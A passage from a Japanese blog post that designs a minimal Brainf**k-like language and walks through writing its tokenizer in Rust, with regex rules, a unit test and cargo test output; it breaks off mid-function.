AAAAAAAAABBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDEEEEEEFFGQPUVOTY   ZQL[MHFEEEEEEEDDDDDDDCCCCCCCCCCCBBBBBBBBBBBBBB
AAAAAAAAAABBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDEEEEEEFFGHIJKS  X KHHGFEEEEEDDDDDDDDDCCCCCCCCCCBBBBBBBBBBBBBBBB
AAAAAAAAAAABBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDEEEEEEFGGHHIKPPKIHGFFEEEDDDDDDDDDCCCCCCCCCCBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAABBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDEEEEEFFGHIMTKLZOGFEEDDDDDDDDDCCCCCCCCCBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAABBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDEEEEFFFI KHGGGHGEDDDDDDDDDCCCCCCCCCBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAABBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDEEEFGIIGFFEEEDDDDDDDDCCCCCCCCCBBBBBBBBBBBBBBBBBBBBBBBBBB</code></pre>
<p>(⋈◍＞◡＜◍)。✧♡</p>
<h2 id="brainfk-レベルのプログラミング言語を設計する">Brainf**k レベルのプログラミング言語を設計する</h2>
<p>次は「Brainf**k レベルに機能を絞った言語」を定義します。今回はこんな感じにしてみました。<code>ptr</code> は組み込みの変数のようなものです。この <code>ptr</code> を Brainf**k 上で操作するポインタとし、それをよくある感じの構文で操作できるようにしたイメージです。本当に Brainf**k に皮をかぶせた程度の機能しかないし、見た目もいろいろと残念なのには目をつぶることにします。</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb12-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 行末までコメント</span></span>
<span id="cb12-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb12-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb12-3" aria-hidden="true" tabindex="-1"></a>ptr <span class="op">+=</span> <span class="dv">123</span><span class="op">;</span>  <span class="co">// 数値だけポインタを進める</span></span>
<span id="cb12-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb12-4" aria-hidden="true" tabindex="-1"></a>ptr <span class="op">-=</span> <span class="dv">123</span><span class="op">;</span>  <span class="co">// 数値だけポインタを戻す</span></span>
<span id="cb12-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb12-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>ptr <span class="op">+=</span> <span class="dv">123</span><span class="op">;</span>  <span class="co">// 数値だけポインタが指す値を加算する</span></span>
<span id="cb12-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>ptr <span class="op">-=</span> <span class="dv">123</span><span class="op">;</span>  <span class="co">// 数値だけポインタが指す値を減算する</span></span>
<span id="cb12-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb12-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb12-9" aria-hidden="true" tabindex="-1"></a>putchar()<span class="op">;</span>  <span class="co">// 標準入力から1文字読んで *ptr に格納する</span></span>
<span id="cb12-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb12-10" aria-hidden="true" tabindex="-1"></a>getchar()<span class="op">;</span>  <span class="co">// *ptr の値を標準出力に書き込む</span></span>
<span id="cb12-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb12-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb12-12" aria-hidden="true" tabindex="-1"></a><span class="co">// ループ (条件式は現状 *ptr のみ)</span></span>
<span id="cb12-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb12-13" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="op">*</span>ptr <span class="op">{</span></span>
<span id="cb12-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb12-14" aria-hidden="true" tabindex="-1"></a>    <span class="co">// do something</span></span>
<span id="cb12-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb12-15" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<h2 id="字句解析を実装する">字句解析を実装する</h2>
<p>今度はソースコードをプログラミング言語で意味のある字句・記号 (トークン) で分割し、内部で扱いやすい形式に変換する字句解析を実装していきます。</p>
<p><a href="https://github.com/Tosainu/chiya/blob/e6f96026af0323fad54c3754b0e4c14322a6bd25/src/token.rs"><code>src/token.rs</code></a> を作成し、まずはトークンを表現するデータ型をこんな感じに定義しました。トークンの分類や名称などは <a href="https://doc.rust-lang.org/stable/reference/tokens.html">Tokens - The Rust Reference</a> などを参考にしました。</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb13-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>derive<span class="at">(</span><span class="bu">Debug</span><span class="op">,</span> <span class="bu">PartialEq</span><span class="at">)]</span></span>
<span id="cb13-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">enum</span> Token <span class="op">{</span></span>
<span id="cb13-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-3" aria-hidden="true" tabindex="-1"></a>    Integer(<span class="dt">i32</span>)<span class="op">,</span></span>
<span id="cb13-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-4" aria-hidden="true" tabindex="-1"></a>    Identifier(<span class="dt">String</span>)<span class="op">,</span></span>
<span id="cb13-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-6" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Keywords</span></span>
<span id="cb13-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-7" aria-hidden="true" tabindex="-1"></a>    While<span class="op">,</span> <span class="co">// 'while'</span></span>
<span id="cb13-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-9" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Punctuation symbols</span></span>
<span id="cb13-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-10" aria-hidden="true" tabindex="-1"></a>    Star<span class="op">,</span>       <span class="co">// '*'</span></span>
<span id="cb13-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-11" aria-hidden="true" tabindex="-1"></a>    PlusEq<span class="op">,</span>     <span class="co">// '+='</span></span>
<span id="cb13-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-12" aria-hidden="true" tabindex="-1"></a>    MinusEq<span class="op">,</span>    <span class="co">// '-='</span></span>
<span id="cb13-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-13" aria-hidden="true" tabindex="-1"></a>    Semi<span class="op">,</span>       <span class="co">// ';'</span></span>
<span id="cb13-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-14" aria-hidden="true" tabindex="-1"></a>    ParenOpen<span class="op">,</span>  <span class="co">// '('</span></span>
<span id="cb13-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-15" aria-hidden="true" tabindex="-1"></a>    ParenClose<span class="op">,</span> <span class="co">// ')'</span></span>
<span id="cb13-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-16" aria-hidden="true" tabindex="-1"></a>    CurlyOpen<span class="op">,</span>  <span class="co">// '{'</span></span>
<span id="cb13-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-17" aria-hidden="true" tabindex="-1"></a>    CurlyClose<span class="op">,</span> <span class="co">// '}'</span></span>
<span id="cb13-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb13-18" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>続いて文字列をトークン列に分割する関数 <code>tokenize()</code> を実装していきます。処理は失敗する可能性があるので、<a href="https://docs.rs/failure/0.1.6/failure/"><code>failure</code> crate</a> を使ったエラー処理を使ってみました。Rust の文字列 (<a href="https://doc.rust-lang.org/std/string/struct.String.html"><code>String</code></a> や <a href="https://doc.rust-lang.org/std/primitive.str.html"><code>str</code></a>) を複数文字ずつチェックしていくいい感じの方法がよくわからず、とりあえず <code>str</code> のメソッド <a href="https://doc.rust-lang.org/std/primitive.str.html#method.get"><code>get()</code></a> を使ってみました。何か Best practice があれば教えてもらえるとうれしいです。</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb14-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>derive<span class="at">(</span><span class="bu">Debug</span><span class="op">,</span> <span class="bu">PartialEq</span><span class="op">,</span> <span class="pp">failure::</span>Fail<span class="at">)]</span></span>
<span id="cb14-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">enum</span> TokenizerError <span class="op">{</span></span>
<span id="cb14-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">#[</span>fail<span class="at">(</span>display <span class="op">=</span> <span class="st">&quot;unexpected character: '{}'&quot;</span><span class="op">,</span> character<span class="at">)]</span></span>
<span id="cb14-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-4" aria-hidden="true" tabindex="-1"></a>    UnexpectedCharacter <span class="op">{</span> character<span class="op">:</span> <span class="dt">char</span> <span class="op">},</span></span>
<span id="cb14-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-6" aria-hidden="true" tabindex="-1"></a>    <span class="at">#[</span>fail<span class="at">(</span>display <span class="op">=</span> <span class="st">&quot;input error&quot;</span><span class="at">)]</span></span>
<span id="cb14-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-7" aria-hidden="true" tabindex="-1"></a>    InputError<span class="op">,</span></span>
<span id="cb14-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb14-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-10" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">fn</span> tokenize(src<span class="op">:</span> <span class="op">&amp;</span><span class="dt">str</span>) <span class="op">-&gt;</span> <span class="dt">Result</span><span class="op">&lt;</span><span class="dt">Vec</span><span class="op">&lt;</span>Token<span class="op">&gt;,</span> TokenizerError<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb14-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-11" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> <span class="kw">mut</span> tokens <span class="op">=</span> <span class="dt">Vec</span><span class="pp">::</span>new()<span class="op">;</span></span>
<span id="cb14-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> <span class="kw">mut</span> cur <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb14-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> cur <span class="op">&lt;</span> src<span class="op">.</span>len() <span class="op">{</span></span>
<span id="cb14-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-14" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="kw">let</span> <span class="cn">Some</span>(s) <span class="op">=</span> src<span class="op">.</span>get(cur<span class="op">..</span>) <span class="op">{</span></span>
<span id="cb14-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-16" aria-hidden="true" tabindex="-1"></a>            <span class="co">// ~~~ トークンへの分割処理 ~~~</span></span>
<span id="cb14-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-18" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="cn">Err</span>(<span class="pp">TokenizerError::</span>UnexpectedCharacter <span class="op">{</span></span>
<span id="cb14-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-19" aria-hidden="true" tabindex="-1"></a>                character<span class="op">:</span> s<span class="op">.</span>chars()<span class="op">.</span>next()<span class="op">.</span>unwrap()<span class="op">,</span></span>
<span id="cb14-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-20" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span>)<span class="op">;</span></span>
<span id="cb14-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-21" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
<span id="cb14-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-22" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="cn">Err</span>(<span class="pp">TokenizerError::</span>InputError)<span class="op">;</span></span>
<span id="cb14-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-23" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb14-24"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-24" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb14-25"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-26"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-26" aria-hidden="true" tabindex="-1"></a>    <span class="cn">Ok</span>(tokens)</span>
<span id="cb14-27"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb14-27" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>コンパイラの教科書や字句解析系を生成するソフトウェアとして有名な <a href="https://en.wikipedia.org/wiki/Lex_(software)">Lex</a> では正規表現が出てくるので、ここでもルールの記述に正規表現を使うことにします。正規表現のライブラリには <a href="https://docs.rs/crate/regex/1.3.1"><code>regex</code> crate</a> を使うことにしました。</p>
<p>簡単なルールから書いていきます。空白文字のスキップと数値のルールをとりあえずこんな感じに書いてみました。</p>
<div class="sourceCode" id="cb15"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb15-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="kw">use</span> <span class="pp">lazy_static::</span>lazy_static<span class="op">;</span></span>
<span id="cb15-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="kw">use</span> <span class="pp">regex::</span>Regex<span class="op">;</span></span>
<span id="cb15-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="pp">lazy_static!</span> <span class="op">{</span></span>
<span id="cb15-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">static</span> <span class="kw">ref</span> WHITESPACES<span class="op">:</span> Regex <span class="op">=</span> <span class="pp">Regex::</span>new(<span class="st">r&quot;^\s+&quot;</span>)<span class="op">.</span>unwrap()<span class="op">;</span></span>
<span id="cb15-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">static</span> <span class="kw">ref</span> INTEGER<span class="op">:</span> Regex <span class="op">=</span> <span class="pp">Regex::</span>new(<span class="st">r&quot;^-?\d+\b&quot;</span>)<span class="op">.</span>unwrap()<span class="op">;</span></span>
<span id="cb15-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb15-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-9" aria-hidden="true" tabindex="-1"></a><span class="co">// 注目している文字列が正規表現 WHITESPACES にマッチしたら</span></span>
<span id="cb15-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-10" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="kw">let</span> <span class="cn">Some</span>(m) <span class="op">=</span> WHITESPACES<span class="op">.</span>find(s) <span class="op">{</span></span>
<span id="cb15-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-11" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 何もせずマッチしたバイト数だけカーソルを進める</span></span>
<span id="cb15-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-12" aria-hidden="true" tabindex="-1"></a>    cur <span class="op">+=</span> m<span class="op">.</span>end()<span class="op">;</span></span>
<span id="cb15-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">continue</span><span class="op">;</span></span>
<span id="cb15-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-14" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb15-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-16" aria-hidden="true" tabindex="-1"></a><span class="co">// 注目している文字列が正規表現 INTEGER にマッチしたら</span></span>
<span id="cb15-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-17" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="kw">let</span> <span class="cn">Some</span>(m) <span class="op">=</span> INTEGER<span class="op">.</span>find(s) <span class="op">{</span></span>
<span id="cb15-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-18" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Token::Integer を追加して</span></span>
<span id="cb15-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-19" aria-hidden="true" tabindex="-1"></a>    tokens<span class="op">.</span>push(<span class="pp">Token::</span>Integer(m<span class="op">.</span>as_str()<span class="op">.</span>parse()<span class="op">.</span>unwrap()))<span class="op">;</span></span>
<span id="cb15-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-20" aria-hidden="true" tabindex="-1"></a>    <span class="co">// マッチしたバイト数だけカーソルを進める</span></span>
<span id="cb15-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-21" aria-hidden="true" tabindex="-1"></a>    cur <span class="op">+=</span> m<span class="op">.</span>end()<span class="op">;</span></span>
<span id="cb15-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-22" aria-hidden="true" tabindex="-1"></a>    <span class="cf">continue</span><span class="op">;</span></span>
<span id="cb15-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb15-23" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>単体テストを書くことで実装の動作確認を行うことにします。Rust では関数に <a href="https://doc.rust-lang.org/reference/attributes/testing.html#the-test-attribute"><code>#[test]</code></a> と付けるだけでテスト用の関数になるのはとてもお手軽で良いですね。</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb16-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>test<span class="at">]</span></span>
<span id="cb16-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> test_tokenize() <span class="op">{</span></span>
<span id="cb16-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb16-3" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(tokenize(<span class="st">&quot;     &quot;</span>)<span class="op">,</span> <span class="cn">Ok</span>(<span class="pp">vec!</span>[]))<span class="op">;</span></span>
<span id="cb16-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb16-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb16-5" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(tokenize(<span class="st">&quot;123&quot;</span>)<span class="op">,</span> <span class="cn">Ok</span>(<span class="pp">vec!</span>[<span class="pp">Token::</span>Integer(<span class="dv">123</span>)]))<span class="op">;</span></span>
<span id="cb16-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb16-6" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(tokenize(<span class="st">&quot;-123&quot;</span>)<span class="op">,</span> <span class="cn">Ok</span>(<span class="pp">vec!</span>[<span class="pp">Token::</span>Integer(<span class="op">-</span><span class="dv">123</span>)]))<span class="op">;</span></span>
<span id="cb16-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb16-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb16-8" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(</span>
<span id="cb16-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb16-9" aria-hidden="true" tabindex="-1"></a>        tokenize(<span class="st">&quot;123 123&quot;</span>)<span class="op">,</span></span>
<span id="cb16-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb16-10" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Ok</span>(<span class="pp">vec!</span>[<span class="pp">Token::</span>Integer(<span class="dv">123</span>)<span class="op">,</span> <span class="pp">Token::</span>Integer(<span class="dv">123</span>)])</span>
<span id="cb16-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb16-11" aria-hidden="true" tabindex="-1"></a>    )<span class="op">;</span></span>
<span id="cb16-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb16-12" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p><code>cargo test --lib</code> で書いたテストを実行してみると、とりあえずそれっぽく動いてそうです。</p>
<pre><code>$ cargo test --lib
   Compiling chiya v0.1.0 (/path/to/work/dir/chiya)
    Finished dev [unoptimized + debuginfo] target(s) in 1.10s
     Running target/debug/deps/chiya-193f94de4648cab5

running 1 test
test token::test_tokenize ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out</code></pre>
<p>単純な文字列の一致で済みそうなケースでも正規表現を利用するのはちょっとアレです。Rust の Linter である <a href="https://github.com/rust-lang/rust-clippy">Clippy</a> も<a href="https://rust-lang.github.io/rust-clippy/master/#trivial_regex">非常に単純な正規表現に警告を出してきたり</a>します。ということで、記号など簡単なルールは文字列の先頭が引数に与えた文字列と一致しているかを判定する <a href="https://doc.rust-lang.org/std/primitive.str.html#method.starts_with"><code>starts_with()</code></a> メソッドを使うことにしました。</p>
<div class="sourceCode" id="cb18"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb18-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 注目している文字列が '+=' で始まっていたら</span></span>
<span id="cb18-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> s<span class="op">.</span>starts_with(<span class="st">&quot;+=&quot;</span>) <span class="op">{</span></span>
<span id="cb18-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb18-3" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Token::PlusEq を追加して</span></span>
<span id="cb18-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb18-4" aria-hidden="true" tabindex="-1"></a>    tokens<span class="op">.</span>push(<span class="pp">Token::</span>PlusEq)<span class="op">;</span></span>
<span id="cb18-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb18-5" aria-hidden="true" tabindex="-1"></a>    <span class="co">// そのバイト数だけカーソルを進める</span></span>
<span id="cb18-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb18-6" aria-hidden="true" tabindex="-1"></a>    cur <span class="op">+=</span> <span class="st">&quot;+=&quot;</span><span class="op">.</span>len()<span class="op">;</span></span>
<span id="cb18-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb18-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">continue</span><span class="op">;</span></span>
<span id="cb18-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb18-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>こんな感じでほかのトークンも認識できるようにしていきます。頻出する「ルールにマッチしたら何かして <code>continue</code>」へ展開されるマクロ <code>match_re!</code> や <code>match_str!</code> なども実装し、<code>tokenize()</code> は最終的にこんな感じになりました。</p>
<div class="sourceCode" id="cb19"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb19-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">fn</span> tokenize(src<span class="op">:</span> <span class="op">&amp;</span><span class="dt">str</span>) <span class="op">-&gt;</span> <span class="dt">Result</span><span class="op">&lt;</span><span class="dt">Vec</span><span class="op">&lt;</span>Token<span class="op">&gt;,</span> TokenizerError<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb19-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> <span class="kw">mut</span> tokens <span class="op">=</span> <span class="dt">Vec</span><span class="pp">::</span>new()<span class="op">;</span></span>
<span id="cb19-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb19-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> <span class="kw">mut</span> cur <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
